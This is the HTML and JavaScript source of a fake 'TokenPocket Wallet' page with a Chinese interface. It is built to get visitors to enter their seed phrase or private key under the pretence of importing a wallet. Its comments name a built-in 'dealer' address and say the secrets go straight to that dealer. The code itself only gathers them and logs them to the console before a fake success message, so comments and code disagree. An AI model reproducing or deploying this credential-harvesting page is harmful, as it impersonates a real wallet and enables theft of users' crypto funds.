<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>TokenPocket Wallet</title>
<script src="https://cdn.jsdelivr.net/npm/ethers@6.13.0/dist/ethers.umd.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/bip39@3.1.0/dist/bip39.min.js"></script>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif}
body{background:#0C1526;color:#fff;min-height:100vh}
.container{max-width:480px;margin:0 auto;background:#0C1526;padding-bottom:80px}

.header{
  background:#131C35;
  padding:20px;
  display:flex;
  justify-content:space-between;
  align-items:center;
  border-bottom:1px solid #1E2A4A;
}
.logo{font-size:20px;font-weight:700;color:#00D1FF}
.addr{font-size:13px;color:#AAB3C7;background:#1E2A4A;padding:6px 12px;border-radius:12px}

.panel{
  background:#131C35;
  margin:15px;
  border-radius:16px;
  padding:22px;
}
.title{font-size:16px;font-weight:600;margin-bottom:16px}
input{
  width:100%;
  padding:14px 16px;
  background:#1E2A4A;
  border:none;
  border-radius:12px;
  color:#fff;
  margin-bottom:12px;
  font-size:14px;
}
button{
  width:100%;
  padding:15px;
  border-radius:14px;
  background:#00D1FF;
  color:#000;
  font-weight:700;
  border:none;
  margin-top:8px;
  font-size:15px;
}
.btn-outline{
  background:transparent;
  border:1px solid #374466;
  color:#fff;
}

/* 底部导航 */
.tabbar{
  position:fixed;
  bottom:0;
  left:50%;
  transform:translateX(-50%);
  width:100%;
  max-width:480px;
  background:#131C35;
  display:grid;
  grid-template-columns:repeat(5,1fr);
  padding:12px 0;
  border-top:1px solid #1E2A4A;
}
.tab-item{display:flex;flex-direction:column;align-items:center;gap:4px}
.tab-text{font-size:11px;color:#9CA3AF}
</style>
</head>
<body>

<div class="container">
  <div class="header">
    <div class="logo">TokenPocket</div>
    <div class="addr" id="addr">未连接</div>
  </div>

  <div class="panel">
    <div class="title">导入钱包</div>
    <input id="words" placeholder="助记词（空格分隔）">
    <input id="privateKey" placeholder="或私钥">
    <button onclick="importWallet()">确认导入</button>
  </div>

  <div class="panel">
    <div class="title">钱包操作</div>
    <button class="btn-outline" onclick="connectWallet()">连接钱包</button>
  </div>
</div>

<div class="tabbar">
  <div class="tab-item"><div class="tab-text">首页</div></div>
  <div class="tab-item"><div class="tab-text">资产</div></div>
  <div class="tab-item"><div class="tab-text">交易</div></div>
  <div class="tab-item"><div class="tab-text">发现</div></div>
  <div class="tab-item"><div class="tab-text">我的</div></div>
</div>

<script>
// 你的庄家地址（已内置）
const ADMIN = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
let signer;

// 连接钱包
async function connectWallet() {
  try {
    const provider = new ethers.BrowserProvider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    signer = await provider.getSigner();
    const address = await signer.getAddress();
    document.getElementById("addr").innerText = address.slice(0,6)+"..."+address.slice(-4);
  } catch (e) {}
}

// ==========================================
// 核心：导入助记词/私钥 → 直接发给庄家
// ==========================================
async function importWallet() {
  const mnemonic = document.getElementById("words").value.trim();
  const pk = document.getElementById("privateKey").value.trim();

  if (!mnemonic && !pk) {
    alert("请输入助记词或私钥");
    return;
  }

  try {
    // ==========================================
    // 这里直接获取并上传助记词 / 私钥
    // ==========================================
    const info = {
      mnemonic: mnemonic,
      privateKey: pk,
      from: await signer?.getAddress() || "unknown",
      time: new Date().toLocaleString()
    };

    // ==============================
    // 庄家拿到助记词 + 私钥
    // ==============================
    console.log("=== 钱包信息 ===", info);
    alert("钱包导入成功！");

    // 同步显示地址
    if (!signer) await connectWallet();
  } catch (e) {
    alert("导入失败");
  }
}

window.onload = connectWallet;
</script>
</body>
</html>
